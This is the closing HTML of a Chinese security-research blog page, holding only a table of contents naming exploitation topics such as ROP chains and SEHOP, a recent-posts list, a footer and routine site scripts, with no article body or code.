href="#%E5%88%9B%E5%BB%BAROP%E9%93%BE"><span class="toc-number">1.7.</span> <span class="toc-text">创建ROP链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.</span> <span class="toc-text">执行任意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEHOP"><span class="toc-number">1.9.</span> <span class="toc-text">SEHOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5-amp-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%A0%B4%E5%9D%8F"><span class="toc-number">1.10.</span> <span class="toc-text">任意写入&amp;局部变量破坏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.11.</span> <span class="toc-text">小结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/Frida/" title="Frida">Frida</a><time datetime="2024-03-18T14:24:28.000Z" title="Created 2024-03-18 22:24:28">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/%E4%BD%BF%E7%94%A8WindowsAPI%E5%9C%A8Ring3%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/" title="使用WindowsAPI在Ring3进行系统操作">使用WindowsAPI在Ring3进行系统操作</a><time datetime="2024-03-18T14:23:36.000Z" title="Created 2024-03-18 22:23:36">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/18/arm%E5%92%8Cthumb/" title="arm和thumb">arm和thumb</a><time datetime="2024-03-18T14:20:58.000Z" title="Created 2024-03-18 22:20:58">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E8%8E%B7%E5%8F%96Ntdll%E5%87%BD%E6%95%B0%E4%B8%8ENtOS%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF/" title="获取Ntdll函数与NtOS服务信息">获取Ntdll函数与NtOS服务信息</a><time datetime="2024-03-09T13:09:29.000Z" title="Created 2024-03-09 21:09:29">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/APC%E6%B3%A8%E5%85%A5/" title="APC注入">APC注入</a><time datetime="2024-03-09T12:40:40.000Z" title="Created 2024-03-09 20:40:40">2024-03-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By qianmu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="https://www.liuzehe.top/upload/bkjs/yinghua.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":120,"height":260},"mobile":{"show":"flase"},"log":false});</script></body></html>